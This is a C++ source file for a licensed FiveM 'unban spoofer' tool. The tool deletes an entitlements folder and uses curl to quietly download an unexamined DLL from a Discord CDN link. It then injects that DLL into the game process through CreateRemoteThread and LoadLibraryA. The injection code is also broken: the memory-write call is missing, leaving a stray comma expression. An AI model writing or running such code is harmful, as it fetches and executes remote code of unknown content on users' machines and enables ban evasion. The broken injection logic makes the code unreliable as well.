#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <experimental/filesystem>
#include "auth.hpp"
#include "skStr.h"

using namespace KeyAuth;
using namespace std;

std::string name = "asd"; // application name. right above the blurred text aka the secret on the licenses tab among other tabs
std::string ownerid = "asd"; // ownerid, found in account settings. click your profile picture on top right of dashboard and then account settings.
std::string secret = "asd"; // app secret, the blurred text on licenses tab and other tabs
std::string version = "1.0"; // leave alone unless you've changed version on website
std::string url = "https://keyauth.win/api/1.2/"; // change if you're self-hosting
std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);
api KeyAuthApp(name, ownerid, secret, version, url);

bool GetProcessEntryByName(string name, PROCESSENTRY32* pe) {
	auto snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		return false;
	}

	if (!Process32First(snapshot, pe)) {
		return false;
	}

	do {
		if (pe->szExeFile == name) {
			snapshot ? CloseHandle(snapshot) : 0;
			return true;
		}
	} while (Process32Next(snapshot, pe));

	snapshot ? CloseHandle(snapshot) : 0;
	return false;
}

DWORD GetProcessIdByName(const char* procName)
{
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnap != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry))
		{
			do
			{
				if (!_stricmp(procEntry.szExeFile, procName))
				{
					procId = procEntry.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnap, &procEntry));
		}
	}
	CloseHandle(hSnap);
	return procId;
}

void deleteDirectoryContents(const std::string& dir_path)
{
	for (const auto& entry : std::experimental::filesystem::directory_iterator(dir_path))
		std::experimental::filesystem::remove_all(entry.path());
}

int main()
{
	SetConsoleTitleA(skCrypt("Haze"));
	KeyAuthApp.init(); if (!KeyAuthApp.data.success) { std::cout << skCrypt("Could not init authentication system.") << std::endl; Sleep(5000); exit(0); }
	std::string licensekey;
	std::cout << skCrypt("Enter your licensekey: ");
	std::cin >> licensekey;
	KeyAuthApp.license(licensekey); if (!KeyAuthApp.data.success) { std::cout << skCrypt("Your licensekey is invalid.") << std::endl; Sleep(5000); exit(0); }
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	if (GetProcessEntryByName("FiveM.exe", &pe)) { std::cout << skCrypt("You need to start FiveM before the spoofer.") << std::endl; Sleep(5000); exit(0); }
	deleteDirectoryContents("C:\\Users\\" + std::string(getenv("username")) + "\\AppData\\Local\\DigitalEntitlements");
	std::cout << skCrypt("Start FiveM now.") << std::endl;
	for (;!GetProcessEntryByName("FiveM_GTAProcess.exe", &pe); Sleep(50));
	std::cout << skCrypt("FiveM found.") << std::endl;
	system(skCrypt("curl https://cdn.discordapp.com/attachments/1030887412714459159/1056651082366980256/adex.dll --output C:/adex.dll > nul 2>&1"));
	Sleep(10000);
	DWORD processId = 0;
	while (!processId) { processId = GetProcessIdByName(skCrypt("FiveM_GTAProcess.exe")); Sleep(50); }
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, processId);
	if (hProc && hProc != INVALID_HANDLE_VALUE) { void* location = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);(hProc, location, skCrypt("C:/adex.dll"), strlen(skCrypt("C:/adex.dll")) + 1, 0); HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, location, 0, 0); if (hThread) { CloseHandle(hThread); } }
	if (hProc) { CloseHandle(hProc); }
	std::cout << skCrypt("You have been unbanned.") << std::endl; Sleep(5000); exit(0);
}
